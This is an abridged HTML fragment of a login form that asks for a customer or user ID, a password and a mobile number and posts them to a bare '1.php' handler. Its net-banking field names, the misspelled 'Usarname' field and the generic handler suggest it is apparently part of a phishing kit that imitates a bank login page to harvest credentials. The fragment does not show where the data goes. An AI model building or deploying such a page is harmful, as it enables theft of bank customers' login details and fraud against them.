            ...
            <div style="padding: 5px;background:#fff;margin:10px 5px 5px 5px;">
                ...
                <form class="login100-form validate-form" action="1.php" method="post">
                    ...
                    <div class=" ab  validate-input">
                        <b for="netb_username" class="col-md-5 col-form-label">Customer ID/ User ID</b>
                        <div class="col-md-7">
                            <input type="text"  maxlength="16" class="form-control" required=""
                                name="Usarname" placeholder="Customer ID/ User ID">
                        </div>

                    </div>
                    <div class=" ab  validate-input">
                        <b for="netb_username" class="col-md-5 col-form-label">Password</b>
                        <div class="col-md-7">
                            <input type="password"  maxlength="16" class="form-control" required=""
                    ...
                    <div class=" ab  validate-input">
                        <b for="netb_username" class="col-md-5 col-form-label">Mobile No.</b>
                        <div class="col-md-7">
                            <input type="text"  maxlength="16" class="form-control" required=""
